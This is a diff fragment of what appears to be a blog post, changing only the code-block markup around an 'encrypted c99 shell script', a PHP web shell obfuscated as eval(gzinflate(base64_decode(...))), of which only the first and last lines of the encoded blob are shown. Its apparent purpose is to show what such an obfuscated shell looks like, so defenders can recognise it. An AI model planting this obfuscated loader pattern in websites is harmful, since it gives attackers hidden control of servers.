@@ -21,7 +21,7 @@ This is what an encrypted c99 shell script looks like:
 
 ### C99 Shell (encrypted) source code
 
-<pre class="brush: php; title: ; notranslate" title="">&lt;? eval(gzinflate(base64_decode('FJ3HjuvKkkV/pWd9AQ7oHfDwLuiN6K3ISYOe
+{% highlight php %}<? eval(gzinflate(base64_decode('FJ3HjuvKkkV/pWd9AQ7oHfDwLuiN6K3ISYOe
 ovfu65s1q4NTUlVmRsRei0VJ//73P//+T3Ek3T/V8xvKLtmKf9JkLQjs//IiG/Pin/8VV
 VRsdi/p27icwpxWGVBXRTRXHlPq3WxbKUOPvguRT7FfQfOYmw9NAnT6uRsQLGgQPJCSah
 uyBJbBhGN6n0owNrtQ2BpQDH1ALHwQvPdlNi7T2yaU8X6ylJw3lySukouRGm62v+V+4Pd
@@ -972,5 +972,5 @@ klCg/rAcQkAgXs4NpasrO2UOXgGCJtvlOWOY9L98pH2cI/N0hd6q08IWIZ/8GCj44rwmQ
 g1GVJYjutUzjQB83oY8Tw6erff68vSotev4QFconwqbqfK4p7GKAKeysJOw0Oc4+6Pp8Z
 9uSfmgfjISyuVwNPVExyr1NUDmGV1BZ1bmQLxb3LRNfrXJApXmlBEfZtXd6tyWaHrENKJ
 rjW5JTKvo/JUiriCsi5JEOUICrNByG6rJSzGFZqQzZelYYwbwigfFBsD9YEESHAQUB6gF
-BcKPfXzD4v//888+//uc///6///w/'))); ?&gt;
-</pre>
+BcKPfXzD4v//888+//uc///6///w/'))); ?>
+{% endhighlight %}
